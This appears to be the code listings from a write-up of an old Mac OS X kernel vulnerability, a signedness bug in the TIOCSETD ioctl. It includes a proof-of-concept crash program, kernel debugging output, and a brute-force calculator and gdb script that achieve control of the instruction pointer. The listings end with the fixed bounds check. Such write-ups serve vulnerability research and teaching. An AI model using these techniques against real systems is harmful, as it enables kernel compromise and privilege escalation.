["```\nosx$ `pwd`\n/Users/tk/xnu-792.13.8\n\nosx$ `grep -rnw -e _IOR -e _IOW -e _IOWR *`\n[..]\nxnu-792.13.8/bsd/net/bpf.h:161:#define BIOCGRSIG        _IOR('B',114, u_int)\nxnu-792.13.8/bsd/net/bpf.h:162:#define BIOCSRSIG        _IOW('B',115, u_int)\nxnu-792.13.8/bsd/net/bpf.h:163:#define BIOCGHDRCMPLT    _IOR('B',116, u_int)\nxnu-792.13.8/bsd/net/bpf.h:164:#define BIOCSHDRCMPLT    _IOW('B',117, u_int)\nxnu-792.13.8/bsd/net/bpf.h:165:#define BIOCGSEESENT     _IOR('B',118, u_int)\nxnu-792.13.8/bsd/net/bpf.h:166:#define BIOCSSEESENT     _IOW('B',119, u_int)\n[..]\n```", "```\nosx$ `grep --include=*.c -rn BIOCGRSIG *`\nxnu-792.13.8/bsd/net/bpf.c:1143:        case BIOCGRSIG:\n```", "```\n[..]\n135 int\n136 at_control(so, `cmd`, `data`, ifp)\n137      struct socket *so;\n138      `u_long cmd;`\n139      `caddr_t data;`\n140      struct ifnet *ifp;\n141 {\n[..]\n```", "```\n[..]\n1025 int\n1026 ifioctl(so, `cmd`, `data`, p)\n1027     struct socket *so;\n1028     `u_long cmd;`\n1029     `caddr_t data;`\n1030     struct proc *p;\n1031 {\n[..]\n```", "```\n[..]\n877 static int\n878 vnioctl(dev_t dev, `u_long cmd`, `caddr_t data`,\n879     __unused int flag, struct proc *p,\n880     int is_char)\n881 {\n[..]\n```", "```\nosx$ `man ioctl`\n[..]\n`SYNOPSIS`\n   `#include <sys/ioctl.h>`\n\n   int\n   `ioctl`(int d, unsigned long request, char *argp);\n\n`DESCRIPTION`\n   The `ioctl()` function manipulates the underlying device parameters of spe-\n   cial files. In particular, many operating characteristics of character\n   special files (e.g. terminals) may be controlled with `ioctl()` requests.\n   The argument d must be an open file descriptor.\n\n   An ioctl request has encoded in it whether the argument is an \"in\"\n   parameter or \"out\" parameter, and the size of the argument argp in\n   bytes. Macros and defines used in specifying an ioctl request are\n   located in the file <sys/ioctl.h>.\n[..]\n```", "```\n[..]\n 816    /*\n 817     * Ioctls for all tty devices.  Called after line-discipline specific ioctl\n 818     * has been called to do discipline-specific functions and/or reject any\n 819     * of these ioctl commands.\n 820     */\n 821    /* ARGSUSED */\n 822    int\n 823    ttioctl(register struct tty *tp,\n 824       `u_long cmd`, `caddr_t data`, int flag,\n 825       struct proc *p)\n 826    {\n[..]\n `872       switch (cmd) {            /* Process the ioctl. */`\n[..]\n`1089       case TIOCSETD: {        /* set line discipline */`\n`1090           register int t = *(int *)data;`\n1091           dev_t device = tp->t_dev;\n1092\n`1093           if (t >= nlinesw)`\n1094               return (ENXIO);\n`1095           if (t != tp->t_line) {`\n1096               s = spltty();\n1097               (*linesw[tp->t_line].l_close)(tp, flag);\n`1098               error = (*linesw[t].l_open)(device, tp);`\n1099               if (error) {\n1100                   (void)(*linesw[tp->t_line].l_open)(device, tp);\n1101                   splx(s);\n1102                   return (error);\n1103               }\n1104               tp->t_line = t;\n1105               splx(s);\n1106           }\n1107           break;\n1108       }\n[..]\n```", "```\n01    typedef char *  caddr_t;\n02\n03    // output the bit pattern\n04    void\n05    bitpattern (int a)\n06    {\n07           int             m       = 0;\n08           int             b       = 0;\n09           int             cnt     = 0;\n10           int             nbits   = 0;\n11           unsigned int    mask    = 0;\n12\n13           nbits = 8 * sizeof (int);\n14           m = 0x1 << (nbits - 1);\n15\n16           mask = m;\n17           for (cnt = 1; cnt <= nbits; cnt++) {\n18                   b = (a & mask) ? 1 : 0;\n19                   printf (\"%x\", b);\n20                   if (cnt % 4 == 0)\n21                           printf (\" \");\n22                   mask >>= 1;\n23           }\n24           printf (\"\\n\");\n25    }\n26\n27    int\n28    main ()\n29    {\n30           caddr_t data    = \"\\xff\\xff\\xff\\xff\";\n31           int     t       = 0;\n32\n33           t = *(int *)data;\n34\n35           printf (\"Bit pattern of t: \");\n36           bitpattern (t);\n37\n38           printf (\"t = %d (0x%08x)\\n\", t, t);\n39\n40           return 0;\n41    }\n```", "```\nosx$ `gcc -o conversion_bug_example conversion_bug_example.c`\n\nosx$ `./conversion_bug_example`\nBit pattern of t: 1111 1111 1111 1111 1111 1111 1111 1111\nt = −1 (0xffffffff)\n```", "```\n01    #include <sys/ioctl.h>\n02\n03    int\n04    main (void)\n05    {\n06       unsigned long    ldisc = 0xff000000;\n07\n08       ioctl (0, TIOCSETD, &ldisc);\n09\n10       return 0;\n11    }\n```", "```\nosx$ `uname -a`\nDarwin osx 8.8.3 Darwin Kernel Version 8.8.3: Wed\n Oct 18 21:57:10 PDT 2006;                            →\n root:xnu-792.15.4.obj~/RELEASE_I386 i386 i386\n\nosx$ `id`\nuid=502(seraph) gid=502(seraph) groups=502(seraph)\n\nosx$ `gcc -o poc poc.c`\n\nosx$ `./poc`\n```", "```\nosx$ `cat /Library/Logs/panic.log`\nSat Mar 3 13:30:58 2007\npanic(cpu 0 caller 0x001A31CE): Unresolved kernel trap (CPU 0, Type\n 14=page fault), registers:\nCR0: 0x80010033, CR2: 0xe0456860, CR3: 0x00d8a000, CR4: 0x000006e0\nEAX: 0xe0000000, EBX: 0xff000000, ECX: 0x04000001, EDX: 0x0386c380\nCR2: 0xe0456860, EBP: 0x250e3d18, ESI: 0x042fbe04, EDI: 0x00000000\nEFL: 0x00010287, EIP: 0x0035574c, CS:  0x00000008, DS:  0x004b0010\n\nBacktrace, Format - Frame : Return Address (4 potential args on stack)\n0x250e3a68 : 0x128d08 (0x3c9a14 0x250e3a8c 0x131de5 0x0)\n0x250e3aa8 : 0x1a31ce (0x3cf6c8 0x0 0xe 0x3ceef8)\n0x250e3bb8 : 0x19a874 (0x250e3bd0 0x1 0x0 0x42fbe04)\n0x250e3d18 : 0x356efe (0x42fbe04 0x8004741b 0x250e3eb8 0x3)\n0x250e3d68 : 0x1ef4de (0x4000001 0x8004741b 0x250e3eb8 0x3)\n0x250e3da8 : 0x1e6360 (0x250e3dd0 0x297 0x250e3e08 0x402a1f4)\n0x250e3e08 : 0x1de161 (0x3a88084 0x8004741b 0x250e3eb8 0x3)\n0x250e3e58 : 0x330735 (0x4050440\n*********\n```", "```\nosx$ `sudo nvram boot-args=\"debug=0x14e\"`\n\nosx$ `sudo reboot`\n```", "```\nlinux$ `ping -c1 10.0.0.2`\nPING 10.0.0.2 (10.0.0.2) from 10.0.0.3 : 56(84) bytes of data.\n64 bytes from 10.0.0.2: icmp_seq=1 ttl=64 time=1.08 ms\n\n--- 10.0.0.2 ping statistics ---\n1 packets transmitted, 1 received, 0% loss, time 0ms\nrtt min/avg/max/mdev = 1.082/1.082/1.082/0.000 ms\n```", "```\nlinux$ `su -`\nPassword:\n\nlinux# `arp -an`\n? (10.0.0.1) at 00:24:E8:A8:64:DA [ether] on eth0\n? (10.0.0.2) at 00:17:F2:F0:47:19 [ether] on eth0\n\nlinux# `arp -s 10.0.0.2 00:17:F2:F0:47:19`\n\nlinux# `arp -an`\n? (10.0.0.1) at 00:24:E8:A8:64:DA [ether] on eth0\n? (10.0.0.2) at 00:17:F2:F0:47:19 [ether] `PERM` on eth0\n```", "```\nDebugger called: <Button SCI>\nDebugger called: <Button SCI>\ncpu_interrupt: sending enter debugger signal (00000002) to cpu 1\nethernet MAC address: 00:17:f2:f0:47:19\nethernet MAC address: 00:17:f2:f0:47:19\nip address: 10.0.0.2\nip address: 10.0.0.2\n\nWaiting for remote debugger connection.\n```", "```\nlinux# `gdb_osx KernelDebugKit_10.4.8/mach_kernel`\nGNU gdb 2003-01-28-cvs (Mon Mar  5 16:54:25 UTC 2007)\nCopyright 2003 Free Software Foundation, Inc.\nGDB is free software, covered by the GNU General Public License, and you are\nwelcome to change it and/or distribute copies of it under certain conditions.\nType \"show copying\" to see the conditions.\nThere is absolutely no warranty for GDB.  Type \"show warranty\" for details.\nThis GDB was configured as \"--host= --target=i386-apple-darwin\".\n```", "```\n(gdb) `target remote-kdp`\n```", "```\n(gdb) `attach 10.0.0.2`\nConnected.\n0x001a8733 in lapic_dump () at /SourceCache/xnu/xnu-792.13.8/osfmk/i386/mp.c:332\n332             int     i;\n```", "```\n(gdb) `continue`\nContinuing.\n```", "```\nosx$ `id`\nuid=502(seraph) gid=502(seraph) groups=502(seraph)\n\nosx$ `./poc`\n```", "```\nProgram received signal SIGTRAP, Trace/breakpoint trap.\n0x0035574c in ttsetcompat (tp=0x37e0804, com=0x8004741b,\n data=0x2522beb8 \"\",                     → term=0x3)\n at /SourceCache/xnu/xnu-792.13.8/bsd/kern/tty_compat.c:145\n145      */\n```", "```\n(gdb) `x/1i $eip`\n0x35574c <ttsetcompat+138>:     call   *0x456860(%eax)\n```", "```\n(gdb) `info registers`\n`eax            0xe0000000`       −536870912\necx            0x4000001        67108865\nedx            0x386c380        59163520\nebx            0xff000000       −16777216\nesp            0x2522bc18       0x2522bc18\nebp            0x2522bd18       0x2522bd18\nesi            0x37e0804        58591236\nedi            0x0              0\neip            0x35574c         0x35574c\neflags         0x10287          66183\ncs             0x8              8\nss             0x10             16\nds             0x4b0010         4915216\nes             0x340010         3407888\nfs             0x25220010       622985232\ngs             0x48             72\n```", "```\n(gdb) `x/6i $eip - 15`\n`0x35573d <ttsetcompat+123>:     mov    %ebx,%eax`\n`0x35573f <ttsetcompat+125>:     shl    $0x5,%eax`\n0x355742 <ttsetcompat+128>:     mov    %esi,0x4(%esp,1)\n0x355746 <ttsetcompat+132>:     mov    0xffffffa8(%ebp),%ecx\n0x355749 <ttsetcompat+135>:     mov    %ecx,(%esp,1)\n`0x35574c <ttsetcompat+138>:     call   *0x456860(%eax)`\n```", "```\naddress of the new value for EIP = (IOCTL input data value << 5) + 0x456860\n```", "```\n01    #include <stdio.h>\n02\n03    #define MEMLOC          0x10203040\n04    #define SEARCH_START    0x80000000\n05    #define SEARCH_END      0xffffffff\n06\n07    int\n08    main (void)\n09    {\n10       unsigned int    a, b = 0;\n11\n12       for (a = SEARCH_START; a < SEARCH_END; a++) {\n13           b = (a << 5) + 0x456860;\n14           if (b == MEMLOC) {\n15               printf (\"Value: %08x\\n\", a);\n16               return 0;\n17           }\n18       }\n19\n20       printf (\"No valid value found.\\n\");\n21\n22       return 1;\n23    }\n```", "```\nosx$ `gcc -o addr_brute_force addr_brute_force.c`\nosx$ `./addr_brute_force`\nValue: 807ed63f\n```", "```\n01    set $MAX_ADDR = 0x00600000\n02\n03    define my_ascii\n04      if $argc != 1\n05        printf \"ERROR: my_ascii\"\n06      else\n07        set $tmp = *(unsigned char *)($arg0)\n08        if ($tmp < 0x20 || $tmp > 0x7E)\n09          printf \".\"\n10        else\n11          printf \"%c\", $tmp\n12        end\n13      end\n14    end\n15\n16    define my_hex\n17      if $argc != 1\n18        printf \"ERROR: my_hex\"\n19      else\n20        printf \"%02X%02X%02X%02X \", \\\n21          *(unsigned char*)($arg0 + 3), *(unsigned char*)($arg0 + 2),     \\\n22          *(unsigned char*)($arg0 + 1), *(unsigned char*)($arg0 + 0)\n23      end\n24    end\n25\n26    define hexdump\n27      if $argc != 2\n28        printf \"ERROR: hexdump\"\n29      else\n30        if ((*(unsigned char*)($arg0 + 0) == (unsigned char)($arg1 >>  0)))\n31          if ((*(unsigned char*)($arg0 + 1) == (unsigned char)($arg1 >>  8)))\n32            if ((*(unsigned char*)($arg0 + 2) == (unsigned char)($arg1 >> 16)))\n33              if ((*(unsigned char*)($arg0 + 3) == (unsigned char)($arg1 >> 24)))\n34                printf \"%08X : \", $arg0\n35                my_hex $arg0\n36                my_ascii $arg0+0x3\n37                my_ascii $arg0+0x2\n38                my_ascii $arg0+0x1\n39                my_ascii $arg0+0x0\n40                printf \"\\n\"\n41              end\n42            end\n43          end\n44        end\n45      end\n46    end\n47\n48    define search_memloc\n49      set $max_addr = $MAX_ADDR\n50      set $counter = 0\n51      if $argc != 2\n52        help search_memloc\n53      else\n54        while (($arg0 + $counter) <= $max_addr)\n55          set $addr = $arg0 + $counter\n56          hexdump $addr $arg1\n57          set $counter = $counter + 0x20\n58        end\n59      end\n60    end\n61    document search_memloc\n62    Search a kernel memory location that points to PATTERN.\n63    Usage: search_memloc ADDRESS PATTERN\n64    ADDRESS - address to start the search\n65    PATTERN - pattern to search for\n66    end\n```", "```\n(gdb) `source search_memloc.gdb`\n(gdb) `search_memloc 0x400000 0x65656565`\n0041BDA0 : 65656565 eeee\n0041BDC0 : 65656565 eeee\n0041BDE0 : 65656565 eeee\n0041BE00 : 65656565 eeee\n0041BE20 : 65656565 eeee\n0041BE40 : 65656565 eeee\n0041BE60 : 65656565 eeee\n0041BE80 : 65656565 eeee\n0041BEA0 : 65656565 eeee\n0041BEC0 : 65656565 eeee\n00459A00 : 65656565 eeee\n00459A20 : 65656565 eeee\n00459A40 : 65656565 eeee\n00459A60 : 65656565 eeee\n00459A80 : 65656565 eeee\n00459AA0 : 65656565 eeee\n00459AC0 : 65656565 eeee\n00459AE0 : 65656565 eeee\n00459B00 : 65656565 eeee\n00459B20 : 65656565 eeee\nCannot access memory at address 0x4dc000\n```", "```\nosx$ `head −3 addr_brute_force.c`\n#include <stdio.h>\n\n#define MEMLOC    `0x0041bda0`\n\nosx$ `gcc -o addr_brute_force addr_brute_force.c`\n\nosx$ `./addr_brute_force`\nValue: 87ffe2aa\n```", "```\nosx$ `head −6 poc.c`\n#include <sys/ioctl.h>\n\nint\nmain (void)\n{\n      unsigned long     ldisc = `0x87ffe2aa`;\n\nosx$ `gcc -o poc poc.c`\n\nosx$ `./poc`\n```", "```\nProgram received signal SIGTRAP, Trace/breakpoint trap.\n`0x65656565 in ?? ()`\n\n(gdb) `info registers`\neax            0xfffc5540       −240320\necx            0x4000001        67108865\nedx            0x386c380        59163520\nebx            0x87ffe2aa       −2013273430\nesp            0x250dbc08       0x250dbc08\nebp            0x250dbd18       0x250dbd18\nesi            0x3e59604        65377796\nedi            0x0              0\n`eip            0x65656565       0x65656565`\neflags         0x10282          66178\ncs             0x8              8\nss             0x10             16\nds             0x3e50010        65339408\nes             0x3e50010        65339408\nfs             0x10             16\ngs             0x48             72\n```", "```\n[..]\n1081       case TIOCSETD: {        /* set line discipline */\n1082           register int t = *(int *)data;\n1083           dev_t device = tp->t_dev;\n1084\n`1085           if (t >= nlinesw || t < 0)`\n1086               return (ENXIO);\n1087           if (t != tp->t_line) {\n1088               s = spltty();\n1089               (*linesw[tp->t_line].l_close)(tp, flag);\n1090               error = (*linesw[t].l_open)(device, tp);\n1091               if (error) {\n1092                   (void)(*linesw[tp->t_line].l_open)(device, tp);\n1093                   splx(s);\n1094                   return (error);\n1095               }\n1096               tp->t_line = t;\n1097               splx(s);\n1098           }\n1099           break;\n1100       }\n[..]\n```", "```\n[..]\n804       case TIOCSETD: {        /* set line discipline */\n805           register int t = *(int *)data;\n806           dev_t device = tp->t_dev;\n807\n`808           if ((u_int)t >= nlinesw)`\n`809               return (ENXIO);`\n810           if (t != tp->t_line) {\n811               s = spltty();\n812               (*linesw[tp->t_line].l_close)(tp, flag);\n813               error = (*linesw[t].l_open)(device, tp);\n814               if (error) {\n815                   (void)(*linesw[tp->t_line].l_open)(device, tp);\n816                   splx(s);\n817                   return (error);\n818               }\n819               tp->t_line = t;\n820               splx(s);\n821           }\n822           break;\n823       }\n[..]\n```"]